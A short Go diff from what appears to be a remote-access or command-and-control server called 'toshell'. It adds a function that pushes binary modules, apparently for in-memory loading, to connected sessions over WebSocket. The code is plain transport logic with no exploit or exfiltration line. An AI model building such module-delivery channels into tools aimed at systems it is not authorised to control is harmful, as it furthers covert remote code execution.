@@ -24,6 +24,7 @@ import (
 	"toshell/internal/common/tunnel"
 	"toshell/internal/common/types"
 	"toshell/internal/server/config"
+	"toshell/internal/server/logging"
 	"toshell/internal/server/session"
 	"toshell/internal/server/task"
 )
@@ -989,4 +990,20 @@ func decompressData(data []byte) ([]byte, error) {
 	}
 
 	return decompressed, nil
+}
+
+// ─── 内存模块二进制下发（v1.4.0 S4）───────────────────────────────────────────
+
+// PushModuleBlob 把模块二进制作为一帧 TypeModuleData 发给会话（WebSocket 通道）。
+// 只做"发一帧"：帧负载的排布（[4B 头长][头 JSON][裸字节]）由
+// internal/common/moduleabi.EncodeBlobFrame 决定，传输层不解析内容。
+func (l *Listener) PushModuleBlob(sessionID, token string, payload []byte) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("empty module blob")
+	}
+	if err := l.sendCtrl(sessionID, protocol.TypeModuleData, payload); err != nil {
+		return fmt.Errorf("failed to push module blob: %w", err)
+	}
+	logging.Info("listener", "module blob pushed to session %s (token=%s size=%d)", sessionID, shortToken(token), len(payload))
+	return nil
 }
